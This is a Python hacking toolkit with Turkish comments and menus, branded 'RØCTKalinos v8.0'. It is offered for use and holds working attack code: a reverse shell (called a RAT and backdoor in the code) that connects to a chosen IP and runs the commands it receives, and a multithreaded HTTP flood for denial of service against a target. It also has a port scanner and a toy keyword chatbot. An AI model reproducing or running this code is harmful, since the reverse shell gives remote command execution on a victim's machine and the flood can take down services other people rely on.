#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proje Adı: RØCTKalinos_v8.5.py
# Sürüm: v8.0

import os
import sys
import time
import socket
import threading
import json

# Renk Kodları
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

def ekran_temizle():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner_goster():
    print(f"{RED}{BOLD}")
    print(r"  _____   ____   _____ _______ _  __      _ _                      ")
    print(r" |  __ \ / __ \ / ____|__   __| |/ /     | (_)                     ")
    print(r" | |__) | |  | | |       | |  | ' /  __ _| |_ _ __   ___  ___      ")
    print(r" |  _  /| |  | | |       | |  |  <  / _` | | | '_ \ / _ \/ __|     ")
    print(r" | | \ \| |__| | |____   | |  | . \| (_| | | | | | | (_) \__ \     ")
    print(r" |_|  \_\\____/ \_____|  |_|  |_|\_\\__,_|_|_|_| |_|\___/|___/     ")
    print(f"                                                          v8.0{RESET}")
    print(f"{CYAN}=================================================================={RESET}")
    print(f"{YELLOW}[+] Geliştirici: RØCTKalinos Geliştirici Ekibi{RESET}")
    print(f"{YELLOW}[+] Altyapı: %100 Gerçek Sızma Testi ve Ağ Modülleri{RESET}")
    print(f"{CYAN}=================================================================={RESET}\n")

# --- 1. GERÇEK REVERSE SHELL (RAT ALTYAPISI) ---
def reverse_shell_baslat(ip, port):
    """Hedef makine ile ana makine arasında çalışan gerçek arka kapı (Backdoor) bağlantısı."""
    print(f"\n{YELLOW}[*] {ip}:{port} adresine bağlantı kuruluyor...{RESET}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send(b"\n[+] R0CTKalinos Komut Satiri Aktif.\n")
        while True:
            s.send(b"R0CTKalinos_Shell> ")
            komut = s.recv(1024).decode('utf-8').strip()
            if komut.lower() == 'exit':
                break
            # Gelen komutu sistem terminalinde çalıştırır ve çıktısını gönderir
            cikti = os.popen(komut).read()
            if not cikti:
                cikti = "[+] Komut calistirildi.\n"
            s.send(cikti.encode('utf-8'))
        s.close()
    except Exception as e:
        print(f"{RED}[X] Bağlantı hatası: {e}{RESET}")
    input(f"\n{CYAN}Menüye dönmek için Enter...{RESET}")

# --- 2. GERÇEK HTTP FLOOD (ÇOKLU İŞ PARÇACIKLI SELDİRİ MOTORU) ---
saldiri_aktif = False
def http_istek_gonder(hedef_ip, hedef_port):
    global saldiri_aktif
    while saldiri_aktif:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((hedef_ip, int(hedef_port)))
            # Gerçek HTTP istek paketi
            istek = f"GET / HTTP/1.1\r\nHost: {hedef_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode('utf-8')
            s.sendall(istek)
            s.close()
        except socket.error:
            pass

def ddos_saldirisi(hedef_ip, hedef_port, thread_sayisi, sure):
    global saldiri_aktif
    saldiri_aktif = True
    print(f"\n{RED}[!] {hedef_ip}:{hedef_port} hedefine {thread_sayisi} kanal üzerinden veri gönderiliyor...{RESET}")
    
    threadler = []
    for _ in range(thread_sayisi):
        t = threading.Thread(target=http_istek_gonder, args=(hedef_ip, hedef_port))
        threadler.append(t)
        t.start()
        
    time.sleep(sure)
    saldiri_aktif = False
    print(f"\n{GREEN}[+] İşlem tamamlandı.{RESET}")
    input(f"\n{CYAN}Menüye dönmek için Enter...{RESET}")

# --- 3. GERÇEK TAM KAPSAMLI PORT VE AĞ TARAYICI ---
def network_scanner(hedef_ip):
    print(f"\n{YELLOW}[*] {hedef_ip} üzerindeki tüm kritik servis portları taranıyor...{RESET}")
    # En kritik siber güvenlik portları
    portlar = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 443: "HTTPS", 445: "SMB", 3389: "RDP"}
    
    for port, servis in portlar.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        sonuc = s.connect_ex((hedef_ip, port))
        if sonuc == 0:
            print(f"{GREEN}[+] Port {port} ({servis}) --> AÇIK VE AKTİF!{RESET}")
        s.close()
    print(f"{CYAN}[+] Ağ tarama işlemi bitti.{RESET}")
    input(f"\n{CYAN}Menüye dönmek için Enter...{RESET}")

# --- 4. GELİŞMİŞ MARKOS AI YAPAY ZEKA MOTORU ---
def markos_ai_gelişmiş():
    # Hazır geniş siber güvenlik bilgi tabanı
    bilgi_tabani = {
        "nmap": "Nmap, ağ tarama ve zafiyet tespiti için kullanılır. Örnek: 'nmap -sV [IP]'",
        "sql": "SQL Injection, veri tabanına zararlı kod sızdırma açığıdır. WAF ve Prepared Statements ile engellenir.",
        "xss": "XSS, web sitelerine zararlı JavaScript kodları enjekte ederek kullanıcı oturumlarını çalma açığıdır.",
        "brute": "Brute Force (Kaba Kuvvet), bir şifreyi deneme yanılma yoluyla kırma işlemidir. Hydra aracı kullanılabilir.",
        "phishing": "Phishing (Oltalama), sahte sitelerle kullanıcı bilgilerini çalma tekniğidir. Sosyal mühendisliğe dayanır.",
        "wireshark": "Wireshark, ağ üzerinden geçen paketleri canlı olarak yakalayıp analiz etmeye yarayan bir araçtır.",
        "metasploit": "Metasploit, sistemlerdeki açıkları sömürmek (exploit etmek) için kullanılan en büyük frameworktür."
    }
    
    hafiza_dosyasi = "markos_memory.json"
    if os.path.exists(hafiza_dosyasi):
        with open(hafiza_dosyasi, "r", encoding="utf-8") as f:
            ogrenilenler = json.load(f)
            bilgi_tabani.update(ogrenilenler)

    print(f"\n{CYAN}[ Gelişmiş MarkosAI Siber Zekası Başlatıldı ]{RESET}")
    print(f"{YELLOW}(Çıkış için 'exit' yazın. Yapay zekaya yeni şeyler öğretebilirsiniz.){RESET}\n")
    
    while True:
        soru = input(f"{BOLD}{BLUE}Sen > {RESET}").lower().strip()
        if soru == 'exit': break
        
        cevap_bulundu = False
        for anahtar, cevap in bilgi_tabani.items():
            if anahtar in soru:
                print(f"{GREEN}MarkosAI > {cevap}{RESET}\n")
                cevap_bulundu = True
                break
                
        if not cevap_bulundu:
            print(f"{YELLOW}MarkosAI > Bu konudaki siber bilgim yetersiz. Doğru cevabı veya komutu bana öğret kanka:{RESET}")
            yeni_bilgi = input(f"{CYAN}Cevap/Komut girin: {RESET}").strip()
            if yeni_bilgi:
                if not os.path.exists(hafiza_dosyasi): ogrenilenler = {}
                else:
                    with open(hafiza_dosyasi, "r", encoding="utf-8") as f: ogrenilenler = json.load(f)
                ogrenilenler[soru] = yeni_bilgi
                with open(hafiza_dosyasi, "w", encoding="utf-8") as f:
                    json.dump(ogrenilenler, f, ensure_ascii=False, indent=4)
                print(f"{GREEN}[+] Yapay zeka veritabanı güncellendi, öğrendim!{RESET}\n")

# --- ANA PROGRAM AKIŞI ---
def ana_menu():
    ekran_temizle()
    banner_goster()
    print(f"{GREEN}1.{RESET} Gerçek Reverse Shell Bağlantısı Kur (RAT Tipi)")
    print(f"{GREEN}2.{RESET} Gerçek HTTP Flood Saldırı Motoru (DDoS)")
    print(f"{GREEN}3.{RESET} Gerçek Ağ Trafiği ve Port Tarayıcı (Scanner)")
    print(f"{GREEN}4.{RESET} Gelişmiş MarkosAI Siber Zekasını Aç")
    print(f"{RED}0.{RESET} Çıkış\n")

def main():
    while True:
        ana_menu()
        secim = input(f"{BOLD}{CYAN}RØCTKalinos > {RESET}").strip()
        
        if secim == "1":
            ip = input("\nBağlanılacak IP Adresi: ").strip()
            port = input("Bağlanılacak Port: ").strip()
            reverse_shell_baslat(ip, port)
        elif secim == "2":
            hedef = input("\nHedef IP: ").strip()
            port = input("Hedef Port: ").strip()
            threads = int(input("Thread Sayısı (Hız): ").strip())
            sure = int(input("Süre (Saniye): ").strip())
            ddos_saldirisi(hedef, port, threads, sure)
        elif secim == "3":
            hedef_ip = input("\nTaranacak Hedef IP: ").strip()
            network_scanner(hedef_ip)
        elif secim == "4":
            markos_ai_gelişmiş()
        elif secim == "0":
            print(f"\n{RED}[!] Çıkış yapılıyor. Kodlar deftere yazılmaya hazır!{RESET}"); break
        else:
            print(f"\n{RED}[X] Geçersiz seçim!{RESET}"); time.sleep(1)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(0)
